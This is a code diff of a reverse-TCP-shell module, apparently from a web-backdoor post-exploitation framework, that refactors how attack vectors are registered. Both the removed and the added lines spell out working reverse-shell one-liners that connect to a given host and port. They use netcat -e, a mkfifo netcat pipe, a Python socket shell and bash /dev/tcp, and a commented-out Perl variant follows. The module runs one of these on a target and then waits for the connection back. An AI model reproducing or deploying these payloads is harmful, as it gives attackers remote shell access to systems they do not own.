@@ -1,6 +1,5 @@
 from core.moduleprobeall import ModuleProbeAll
 from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
-from core.vector import VectorList, Vector
 from core.savedargparse import SavedArgumentParser as ArgumentParser
 from urlparse import urlparse
 from telnetlib import Telnet
@@ -89,27 +88,26 @@ class TcpServer:
 class Reversetcp(ModuleProbeAll):
     '''Send reverse TCP shell'''
 
-    def _init_vectors(self):
-        self.vectors = VectorList([
-                Vector('shell.sh', 'netcat-traditional', """sleep 1; nc -e $shell $host $port"""),
-                Vector('shell.sh', 'netcat-bsd', """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $host $port >/tmp/f"""),
-                Vector('shell.sh', 'python', """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'"""),
-                Vector('shell.sh', 'devtcp', "sleep 1; /bin/bash -c \'$shell 0</dev/tcp/$host/$port 1>&0 2>&0\'"),
+    def _set_vectors(self):
+        self.vectors.add_vector('netcat-traditional', 'shell.sh',  """sleep 1; nc -e $shell $host $port""")
+        self.vectors.add_vector('netcat-bsd','shell.sh',  """sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $host $port >/tmp/f""")
+        self.vectors.add_vector( 'python','shell.sh', """sleep 1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$host",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["$shell","-i"]);'""")
+        self.vectors.add_vector('devtcp','shell.sh',  "sleep 1; /bin/bash -c \'$shell 0</dev/tcp/$host/$port 1>&0 2>&0\'")
                 #TODO: Seems broken
-                #Vector('shell.sh', 'perl', """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""),
-            ])
+        #self.vectors.add_vector('perl','shell.sh',  """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")
+
     
-    def _init_args(self):
+    def _set_args(self):
         self.argparser.add_argument('host', help='Host where connect to')
         self.argparser.add_argument('-port', help='Port', type=int, default=19091)
         self.argparser.add_argument('-shell', help='Shell', default='/bin/sh')
-        self.argparser.add_argument('-vector', choices = self.vectors.get_names())
+        self.argparser.add_argument('-vector', choices = self.vectors.keys())
         self.argparser.add_argument('-no-connect', help='Skip autoconnect', action='store_true')
 
 
 
     def _execute_vector(self):
-        self.current_vector.execute_background(self.modhandler, { 'port': self.args['port'], 'shell' : self.args['shell'], 'host' : self.args['host'] })
+        self.current_vector.execute_background( { 'port': self.args['port'], 'shell' : self.args['shell'], 'host' : self.args['host'] })
         if not self.args['no_connect']:
             if TcpServer(self.args['port']).socket_state:
                 raise ProbeSucceed(self.name, 'Tcp connection succeed')
